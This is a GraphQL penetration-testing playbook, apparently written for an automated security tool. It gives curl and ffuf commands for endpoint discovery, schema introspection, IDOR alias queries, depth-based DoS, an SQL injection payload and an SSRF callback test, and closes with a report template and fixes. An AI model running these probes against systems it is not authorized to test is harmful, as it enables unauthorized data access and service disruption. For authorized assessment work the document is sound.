# GraphQL Advanced Testing

## Overview
Deep GraphQL testing: endpoint discovery, introspection, schema mapping, authz checks,
batching/alias abuse, depth & complexity DoS, persisted queries, file uploads, and resolver injection.

## Prerequisites
```bash
apt-get install -y jq
# Optional tools
pip install gql graphql-core
go install github.com/ffuf/ffuf@latest
```

## Phase 1: Endpoint Discovery
```bash
cat > /workspace/output/graphql_paths.txt <<'PATHS'
graphql
api/graphql
graphql/api
gql
v1/graphql
v2/graphql
PATHS

ffuf -u https://TARGET/FUZZ -w /workspace/output/graphql_paths.txt \
  -mc 200,400,401,403 \
  -o /workspace/output/TARGET_graphql_endpoints.json -of json
```

## Phase 2: Introspection & Schema Dump
```bash
GRAPHQL_ENDPOINT="https://TARGET/GRAPHQL_ENDPOINT"

cat > /workspace/output/graphql_introspection.json <<'INTROSPECT'
{"query":"query IntrospectionQuery { __schema { queryType { name fields { name args { name type { name kind ofType { name kind } } } } } mutationType { name fields { name args { name type { name kind ofType { name kind } } } } } types { name kind } } }"}
INTROSPECT

curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  --data @/workspace/output/graphql_introspection.json \
  | tee /workspace/output/TARGET_graphql_introspection.json

# GET-style introspection (sometimes allowed when POST is blocked)
curl -s -G "$GRAPHQL_ENDPOINT" \
  --data-urlencode "query=$(cat /workspace/output/graphql_introspection.json | jq -r '.query')" \
  | tee /workspace/output/TARGET_graphql_introspection_get.json

# Extract query/mutation names
jq -r '.data.__schema.queryType.fields[]?.name' \
  /workspace/output/TARGET_graphql_introspection.json \
  > /workspace/output/TARGET_graphql_queries.txt
jq -r '.data.__schema.mutationType.fields[]?.name' \
  /workspace/output/TARGET_graphql_introspection.json \
  > /workspace/output/TARGET_graphql_mutations.txt
```

## Phase 3: Build Test Queries
```bash
cat > /workspace/output/TARGET_graphql_query.json <<'QUERY'
{"query":"query($id:ID!){ user(id:$id){ id email role } }","variables":{"id":"1"}}
QUERY

# Replace user/id/email/role with schema-specific fields
curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  --data @/workspace/output/TARGET_graphql_query.json \
  | tee /workspace/output/TARGET_graphql_query_resp.json
```

## Phase 4: Authorization & IDOR Testing
```bash
cat > /workspace/output/TARGET_graphql_idor.json <<'IDOR'
{"query":"query{ a:user(id:\"1\"){id email} b:user(id:\"2\"){id email} }"}
IDOR

curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  --data @/workspace/output/TARGET_graphql_idor.json \
  | tee /workspace/output/TARGET_graphql_idor_resp.json
```

## Phase 5: Batching & Alias Overloading
```bash
cat > /workspace/output/TARGET_graphql_batch.json <<'BATCH'
[
  {"query":"{__typename}"},
  {"query":"{__schema{queryType{name}}}"}
]
BATCH

curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  --data @/workspace/output/TARGET_graphql_batch.json \
  | tee /workspace/output/TARGET_graphql_batch_resp.json
```

## Phase 6: Depth & Complexity Abuse
```bash
cat > /workspace/output/TARGET_graphql_deep.query <<'DEEP'
query Deep {
  user(id:"1") {
    friends {
      friends {
        friends {
          id
        }
      }
    }
  }
}
DEEP

# Replace user/friends with a self-referential field from your schema
jq -Rs '{query: .}' /workspace/output/TARGET_graphql_deep.query \
  > /workspace/output/TARGET_graphql_deep.json

curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  --data @/workspace/output/TARGET_graphql_deep.json \
  | tee /workspace/output/TARGET_graphql_deep_resp.json
```

## Phase 7: Resolver Injection & SSRF Surface
```bash
cat > /workspace/output/TARGET_graphql_injection.json <<'INJECT'
{"query":"query($q:String!){ search(q:$q){ id } }","variables":{"q":"' OR 1=1 --"}}
INJECT

curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  --data @/workspace/output/TARGET_graphql_injection.json \
  | tee /workspace/output/TARGET_graphql_injection_resp.json

# URL/SSRF-style resolver test (replace field names)
cat > /workspace/output/TARGET_graphql_ssrf.json <<'SSRF'
{"query":"mutation($url:String!){ fetchUrl(url:$url){ status } }","variables":{"url":"http://CALLBACK"}}
SSRF

curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  --data @/workspace/output/TARGET_graphql_ssrf.json \
  | tee /workspace/output/TARGET_graphql_ssrf_resp.json
```

## Phase 8: File Upload (Multipart Spec)
```bash
curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -F 'operations={"query":"mutation($file:Upload!){ uploadFile(file:$file){ id url } }","variables":{"file":null}}' \
  -F 'map={"0":["variables.file"]}' \
  -F '0=@/path/to/file.txt;type=text/plain' \
  | tee /workspace/output/TARGET_graphql_upload.json
```

## Phase 9: Persisted Queries
```bash
cat > /workspace/output/TARGET_graphql_pq.json <<'PQ'
{"operationName":"GetUser","variables":{"id":"1"},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<SHA256_HASH>"}}}
PQ

curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  --data @/workspace/output/TARGET_graphql_pq.json \
  | tee /workspace/output/TARGET_graphql_pq_resp.json
```

## Report Template

```
Target: TARGET
GraphQL Endpoint: <URL>
Assessment Date: <DATE>

## Confirmed Findings
- [ ] Introspection enabled in production
- [ ] Unauthorized data access via IDOR
- [ ] Batching/alias abuse allowed
- [ ] Depth/complexity limits missing
- [ ] Resolver injection (SQL/NoSQL/SSRF)
- [ ] Persisted query abuse
- [ ] Unsafe file upload handling

## Evidence
- Introspection response: /workspace/output/TARGET_graphql_introspection.json
- IDOR response: /workspace/output/TARGET_graphql_idor_resp.json
- Batch response: /workspace/output/TARGET_graphql_batch_resp.json
- Deep query response: /workspace/output/TARGET_graphql_deep_resp.json

## Recommendations
1. Disable introspection in production or restrict by authn
2. Enforce field-level authz and object-level checks
3. Set depth/complexity limits and disable batching if not needed
4. Validate resolver inputs and apply allowlists for outbound requests
5. Enforce file upload validation and storage isolation
```

## Output Files
- `/workspace/output/TARGET_graphql_endpoints.json` — endpoint discovery
- `/workspace/output/TARGET_graphql_introspection.json` — schema dump
- `/workspace/output/TARGET_graphql_queries.txt` — query list
- `/workspace/output/TARGET_graphql_mutations.txt` — mutation list
- `/workspace/output/TARGET_graphql_batch_resp.json` — batching response
- `/workspace/output/TARGET_graphql_deep_resp.json` — depth test response
- `/workspace/output/TARGET_graphql_upload.json` — file upload response

indicators: graphql, graphql api, graphql introspection, graphql schema, graphql batching, graphql complexity, graphql depth, graphql file upload, persisted query, gql
